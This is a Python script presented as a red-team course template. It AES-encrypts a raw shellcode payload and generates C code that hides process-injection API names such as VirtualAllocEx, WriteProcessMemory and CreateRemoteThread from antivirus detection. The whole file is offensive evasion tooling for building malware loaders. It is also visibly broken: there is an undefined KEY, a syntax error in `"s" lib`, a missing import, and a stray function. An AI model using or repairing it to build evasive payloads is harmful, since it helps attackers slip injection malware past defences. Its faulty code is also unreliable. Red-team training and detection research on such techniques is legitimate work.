# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @sektor7net)

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()
ciphertext = aesenc(plaintext, KEY)


def caps(word):
    r = re.findall('([A-Z])', word)
    print(r.string())
    


def obfuser(ApiCallToObfus, lib):
    # for each function generate a key and output
    KEY = urandom(16)
    stringlib = "s" lib
    stringApiCallToObfus = "s" + ApiCallToObfus
    pointerApiCallToObfus = "p" + ApiCallToObfus
    
    unsignedencstring = 'unsigned char '+stringApiCallToObfus+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
    unsignedencstring = 'unsigned char '+stringApiCallToObfus+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
    AESdecstring = 'AESDecrypt((char *) '+stringApiCallToObfus+', sizeof('+stringApiCallToObfus+'), key, sizeof(key));	'
    pString = pointerApiCallToObfus+' = GetProcAddress(GetModuleHandle("kernel32.dll"), '+stringApiCallToObfus+');'
    
    return unsignedencstring,AESdecstring,pString
    
    
    
    #->unsigned char sVirtualAllocEx[] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78 };
    #->AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));	
    #pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
    
   
# Payload section
print('char key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('unsigned char calc_payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
print("unsigned int calc_len = sizeof(calc_payload);")



# Obfuscation section



# kernel32.dll
kek = ['VirtualAllocEx','WriteProcessMemory','CreateRemoteThread','VirtualAlloc','CreateToolhelp32Snapshot', 'RtlMoveMemory']
# Ntdll.dll
kek2 = ['RtlMoveMemory']

for i in kek:
    print('\n')
    for i in obfuser(i, 'kernel32.dll'):
        print(i) 

